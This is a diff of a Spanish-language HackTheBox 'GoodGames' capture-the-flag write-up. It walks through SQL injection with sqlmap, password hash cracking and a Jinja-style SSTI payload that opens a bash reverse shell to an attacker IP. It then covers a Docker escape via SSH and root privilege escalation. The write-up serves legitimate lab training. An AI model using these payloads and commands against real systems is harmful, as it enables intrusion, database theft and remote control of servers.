@@ -8,28 +8,26 @@
 </head>
 <body>
   <div class="post-layout">
-    <!-- SIDEBAR -->
     <aside class="post-sidebar">
       <div class="sidebar-avatar">
         <img src="../img/avatar.png" alt="Tu avatar" />
       </div>
-      <h2 class="sidebar-name">TU ALIAS</h2>
-      <p class="sidebar-role">Pentester · HTB Player</p>
+      <h2 class="sidebar-name">ZerasedZ</h2>
+      <p class="sidebar-role">HTB Player</p>
 
       <ul class="sidebar-list">
         <li>HTB</li>
         <li>Web · Linux</li>
-        <li>GoodGames</li>
+        <li></li>
       </ul>
 
       <ul class="sidebar-links">
-        <li><a href="https://hackthebox.com">HTB</a></li>
+        <li><a href="https://profile.hackthebox.com/profile/019d4be4-ec1e-706b-9196-b4be2dab6db5">HTB</a></li>
         <li><a href="https://twitter.com">Twitter</a></li>
-        <li><a href="https://github.com">GitHub</a></li>
+        <li><a href="https://github.com/JeinerGutierrez">GitHub</a></li>
       </ul>
     </aside>
 
-    <!-- CONTENIDO DEL WRITEUP -->
     <main class="post-main">
       <header class="post-header">
         <p class="post-breadcrumb">Home / GoodGames HTB - Writeup</p>
@@ -37,23 +35,103 @@
         <p class="post-date">May 29, 2026 · Linux · Medium</p>
       </header>
 
-      <section class="post-section">
-        <h2>Índice</h2>
-        <ol class="post-index">
-          <li>Enumeración inicial</li>
-          <li>Web enumeration</li>
-          <li>Exploiting SQLi</li>
-          <li>Subdomain enumeration</li>
-          <li>Exploiting SSTI</li>
-          <li>Docker escape</li>
-          <li>Privesc to root</li>
-        </ol>
-      </section>
 
       <section class="post-section">
+        <h2>El día de hoy vamos a resolver la maquina GoodGames de HackTheBox. Es una maquina Linux - Medium</h2>
+        <img src="goodgames/img-machine1.png" alt="Tu foto" />
         <h2>1. Enumeración inicial</h2>
-        <p>Lo primero será un escaneo completo de puertos con nmap:</p>
-        <pre><code>nmap -sCV -p- 10.10.11.130</code></pre>
+        <p>Lo primero será un escaneo de puertos usando la herramienta nmap:</p>
+        <pre><code>nmap -sC -sV -Pn -p80 10.129.96.71</code></pre>
+        <img src="goodgames/img-nmap.png" alt="Tu foto" />
+        <p>Podemos ver que el puerto 80 (http) está abierto. </p>
+        <h2>2. Website </h2>
+        <p>Si entramos a la página web podemos ver que es un foro de videojuegos, si exploramos podemos ver que tiene una funcionalidad que nos permite crearnos una cuenta e iniciar sesión con ella.</p>
+        <img src="goodgames/img-register.png" alt="Tu foto" />
+        <p>Vamos a crearnos una cuenta para ver si podemos acceder a otras funcionalidades.</p>
+        <img src="goodgames/img-login.png" alt="Tu foto" />
+        <p>Cuando nos loggeamos podemos nuestro usuario con el cual nos registramos, ahora vamos a capturar con Burp Suite el requests de login.</p>
+        <h2>3. Inyección SQL</h2>
+        <p>Para poder capturar el requests modificamos el proxy de nuestro navegador o usamos la herramienta de FoxyProxy.</p>
+        <img src="goodgames/img-proxy.png" alt="Tu foto" />
+        <p>Una vez hecho lo anterior, capturamos el request logueándonos en la página.</p>
+        <img src="goodgames/img-burp.png" alt="Tu foto" />
+        <p>Posteriormente probamos una inyección SQL básica y podemos ver como el inicio de sesión es efectuado y nos dumpea los usuarios.</p>
+        <img src="goodgames/img-sql.png" alt="Tu foto" />
+        <p>Para poder acceder como adminpepito123 tenemos que acceder al link de la respuesta, para poder acceder con total normalidad tenemos que desactivar desactivar la captura de proxy en Burp Suite y luego cambiar la configuración del proxy a la normal o desactivar el FoxyProxy.</p>
+        <img src="goodgames/img-burpbrowser.png" alt="Tu foto" />
+        <img src="goodgames/img-loginadmin.png" alt="Tu foto" />
+        <p>Como podemos ver ahora somos adminpepito123, Una vez siendo adminpepito123 navegamos por la página para ver si encontramos algo nuevo.</p>
+        <img src="goodgames/img-newoption.png" alt="Tu foto" />
+        <img src="goodgames/img-errorpage.png" alt="Tu foto" />
+        <p>Como podemos ver se nos habilitó una nueva opción, pero al ingresar no carga la página, entonces tenemos que agregar el nuevo dominio al /etc/hosts</p>
+        <img src="goodgames/img-newdomain.png" alt="Tu foto" />
+        <p>Después de agregar la IP con su dominio a /etc/hosts vemos que la página carga con normalidad</p>
+        <img src="goodgames/img-pagegood.png" alt="Tu foto" />
+        <h2>4. Inyección SQL con ayuda de SQLMAP</h2>
+        <p>Si recordamos, anteriormente pudimos acceder siendo admin usando inyección SQL, eso quiere decir que podemos sacar la base datos usando la herramienda sqlmap. Vamos a sacar la base de datos.</p>
+        <p>Usamos el siguiente comando: </p>
+        <pre><code>sqlmap -u "http://10.129.96.71/login" --data="email=test&password=test" -p email --level=5 --risk=3 --dbs --batch</code></pre>
+        <img src="goodgames/img-sqlmal1.png" alt="Tu foto" />
+        <img src="goodgames/img-sqlmapend.png" alt="Tu foto" />
+        <p>Vemos que logramos obtener una base de datos con el nombre main, ahora vamos a sacar la data.</p>
+        <p>Usamos el siguiente comando: </p>
+        <pre><code>sqlmap -u "http://10.129.96.71/login" --data="email=test&password=test" -p email --level=5 --risk=3 -D main --dump --batch</code></pre>
+        <img src="goodgames/img-sqlmap2.png" alt="Tu foto" />
+        <img src="goodgames/img-sqlmapdata.png" alt="Tu foto" />
+        <h2>5. Cracking admin password</h2>
+        <p>Como podemos ver logramos obtener los usuarios y las contraseñas hasheadas, vamos a usar una pagina para romper el hash de la contraseña del administrador o también podemos usar John the Ripper</p>
+        <img src="goodgames/img-hash.png" alt="Tu foto" />
+        <p>Teniendo la contraseña del admin podemos acceder a la pagina que encontramos anteriormente Posteriormente exploraremos un poco la página.</p>
+        <img src="goodgames/img-panel.png" alt="Tu foto" />
+        <img src="goodgames/img-panelogin.png" alt="Tu foto" />
+        <img src="goodgames/img-edit.png" alt="Tu foto" />
+        <p>Como podemos ver hay una funcionalidad en la página que nos permite cambiar nuestros datos, eso quiere decir que hay la posibilidad de que podamos explotar la vulnerabilidad de SSTI, pero tenemos que ver con que lenguaje está hecho la página.</p>
+        <h2>6. Exploiting SSTI (Server-Side Template Injection)</h2>
+        <p>Para saber en que lenguaje está hecho la página usaremos la herramienta whaweb.</p>
+        <p>Usamos el siguiente comando: </p>
+        <pre><code>whatweb http://internal-administration.goodgames.htb/settings</code></pre>
+        <img src="goodgames/img-whatweb.png" alt="Tu foto" />
+        <p>Vemos que está hecho con Python, eso quiere decir que podemos explotar SSTI, vamos a probarlo. </p>
+        <img src="goodgames/img-exploting.png" alt="Tu foto" />
+        <p>Vemos que si se puede, entonces podemos establecer una revershell, para esto nos vamos a ayudar de la página de Hacktricks para poder armar la revershell.</p>
+        <img src="goodgames/img-hacktricks.png" alt="Tu foto" />
+        <img src="goodgames/img-revershell1.png" alt="Tu foto" />
+        <p>Como podemos ver nos dan los siguientes comandos para poder probar si es vulnerable y nos devuelve el id del usuario en este caso admin. Usaremos el ultimo para probarlo. </p>
+        <img src="goodgames/img-idroot.png" alt="Tu foto" />
+        <p>Vemos que el id del usuario admin es root, entonces ahora procedemos armar la revershell con ayuda de un generador, donde colocaremos nuestra IP con el puerto por donde se va a comunicar. </p>
+        <img src="goodgames/img-generator.png" alt="Tu foto" />
+        <p>Usaremos el comando sacado de Hacktricks y cambiaremos en la parte del id por la revershell generada anteriormente cambiando un poco la estructura, quedaria así: </p>
+        <pre><code>'bash -c "bash -i >& /dev/tcp/10.10.16.5/4444 0>&1"'</code></pre>
+        <p>La revershell completa quedaria así: </p>
+        <pre><code>{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.5/4444 0>&1"').read() }}</code></pre>
+        <p>Abrimos una terminal y pones a la escucha con netcat usando el siguiente comando:</p>
+        <pre><code>nc -lvnp 4444</code></pre>
+        <img src="goodgames/img-revershellgood.png" alt="Tu foto" />
+        <p>Como podemos ver logramos establecer conexión con la revershell y entramos como root.</p>
+        <img src="goodgames/img-reverroot.png" alt="Tu foto" />
+        <h2>7. Docker Scape</h2>
+        <p>Si hacemos un ls podemos ver que estamos en un docker, pero vamos a explorar un poco a ver si encontramos algo interesante.</p>
+        <img src="goodgames/img-flaguser.png" alt="Tu foto" />
+        <p>Encontramos la flag del usuario.</p>
+        <img src="goodgames/img-ipdocker.png" alt="Tu foto" />
+        <p>Ahora intentamos conectarnos por SSH con el usuario augustus para escapar del docker.</p>
+        <img src="goodgames/img-ssherror.png" alt="Tu foto" />
+        <p>Al querer conectarnos por SSH hacia el host (172.19.0.1) falla porque nuestra shell es básica y SSH requiere una terminal interactiva (TTY) para pedir credenciales. Solucionamos esto haciendo un tratamiento de la TTY usando Python antes de volver a conectarnos. </p>
+        <p>Usamos el siguiente comando: </p>
+        <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+        <img src="goodgames/img-ttl.png" alt="Tu foto" />
+        <p>Ahora intentamos nuevamente</p>
+        <img src="goodgames/img-sshverygood.png" alt="Tu foto" />
+        <p>Ahora si pudimos ingresar con total normalidad.</p>
+        <h2>8. Escalada de privilegios</h2>
+        <p>Para escalar privilegios al usuario root nos ayudaremos del docker, copiaremos bash al directorio de augustus.</p>
+        <img src="goodgames/img-copiabash.png" alt="Tu foto" />
+        <p>Ahora asignaremos los permisos desde el docker y nos volveremos a conectar por SSH.</p>
+        <img src="goodgames/img-permisos.png" alt="Tu foto" />
+        <p>Ahora simplemente ejecutamos la bash de forma privilegiada y buscamos la flag de root.</p>
+        <img src="goodgames/img-flagroot.png" alt="Tu foto" />
+
+        
       </section>
     </main>
   </div>
